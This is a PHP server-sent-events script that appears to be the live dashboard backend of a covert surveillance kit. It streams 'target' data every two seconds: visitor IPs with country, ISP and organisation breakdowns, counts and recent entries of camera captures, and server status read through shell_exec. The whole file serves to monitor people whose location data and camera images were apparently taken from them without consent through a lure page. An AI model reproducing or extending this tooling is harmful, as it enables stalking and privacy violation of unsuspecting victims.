<?php
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');
header('Connection: keep-alive');
header('Access-Control-Allow-Origin: *');

// Function to send SSE data
function sendSSE($data) {
    echo "data: " . json_encode($data) . "\n\n";
    ob_flush();
    flush();
}

// Function to get detailed target data
function getDetailedTargetData() {
    $data = [];
    
    // Get latest IP logs with full details
    if (file_exists('ip.json')) {
        $ip_logs = json_decode(file_get_contents('ip.json'), true);
        if (!empty($ip_logs)) {
            $latest_ip = end($ip_logs);
            $data['latest_ip'] = $latest_ip;
            $data['total_visitors'] = count($ip_logs);
            
            // Get unique IPs
            $unique_ips = [];
            $countries = [];
            $isps = [];
            $organizations = [];
            
            foreach ($ip_logs as $log) {
                $unique_ips[$log['ip']] = true;
                if (isset($log['geolocation']['country']) && $log['geolocation']['country'] !== 'Unknown') {
                    $countries[$log['geolocation']['country']] = ($countries[$log['geolocation']['country']] ?? 0) + 1;
                }
                if (isset($log['geolocation']['isp']) && $log['geolocation']['isp'] !== 'Unknown') {
                    $isps[$log['geolocation']['isp']] = ($isps[$log['geolocation']['isp']] ?? 0) + 1;
                }
                if (isset($log['geolocation']['organization']) && $log['geolocation']['organization'] !== 'Unknown') {
                    $organizations[$log['geolocation']['organization']] = ($organizations[$log['geolocation']['organization']] ?? 0) + 1;
                }
            }
            
            $data['unique_visitors'] = count($unique_ips);
            $data['top_countries'] = array_slice(arsort($countries) ? $countries : [], 0, 5, true);
            $data['top_isps'] = array_slice(arsort($isps) ? $isps : [], 0, 5, true);
            $data['top_organizations'] = array_slice(arsort($organizations) ? $organizations : [], 0, 5, true);
            
            // Get recent visitors (last 10)
            $data['recent_visitors'] = array_slice($ip_logs, -10);
        }
    }
    
    // Get latest camera captures with full details
    if (file_exists('captures.json')) {
        $captures = json_decode(file_get_contents('captures.json'), true);
        if (!empty($captures)) {
            $latest_capture = end($captures);
            $data['latest_capture'] = $latest_capture;
            $data['total_captures'] = count($captures);
            
            // Get captures from different time periods
            $now = time();
            $recent_captures = [
                'last_hour' => 0,
                'last_6hours' => 0,
                'last_24hours' => 0,
                'last_week' => 0
            ];
            
            foreach ($captures as $capture) {
                $age = $now - $capture['timestamp_unix'];
                if ($age <= 3600) $recent_captures['last_hour']++;
                if ($age <= 21600) $recent_captures['last_6hours']++;
                if ($age <= 86400) $recent_captures['last_24hours']++;
                if ($age <= 604800) $recent_captures['last_week']++;
            }
            
            $data['captures_by_time'] = $recent_captures;
            
            // Get recent captures (last 10)
            $data['recent_captures'] = array_slice($captures, -10);
        }
    }
    
    // Get server status
    $data['server_time'] = date('Y-m-d H:i:s');
    $data['server_unix_time'] = time();
    $data['server_uptime'] = shell_exec('uptime 2>/dev/null || echo "N/A"');
    $data['memory_usage'] = memory_get_usage(true);
    $data['memory_peak'] = memory_get_peak_usage(true);
    $data['memory_limit'] = ini_get('memory_limit');
    
    // Get disk usage
    $data['disk_usage'] = 'N/A';
    if (function_exists('disk_free_space')) {
        $free = disk_free_space('.');
        $total = disk_total_space('.');
        if ($free !== false && $total !== false) {
            $used = $total - $free;
            $data['disk_usage'] = [
                'total' => formatBytes($total),
                'used' => formatBytes($used),
                'free' => formatBytes($free),
                'percentage' => round(($used / $total) * 100, 2)
            ];
        }
    }
    
    // Get active connections
    $data['active_connections'] = 'N/A';
    if (function_exists('shell_exec')) {
        $connections = shell_exec('netstat -an 2>/dev/null | grep :8080 | grep ESTABLISHED | wc -l');
        if ($connections !== null) {
            $data['active_connections'] = trim($connections);
        }
    }
    
    // Get PHP info
    $data['php_version'] = PHP_VERSION;
    $data['php_memory_limit'] = ini_get('memory_limit');
    $data['php_max_execution_time'] = ini_get('max_execution_time');
    $data['php_upload_max_filesize'] = ini_get('upload_max_filesize');
    
    return $data;
}

// Format bytes to human readable
function formatBytes($bytes) {
    if ($bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}

// Main monitoring loop
$counter = 0;
while (true) {
    $data = getDetailedTargetData();
    $data['counter'] = $counter++;
    sendSSE($data);
    
    // Check for client disconnect
    if (connection_aborted()) {
        break;
    }
    
    // Send update every 2 seconds
    sleep(2);
}
?>
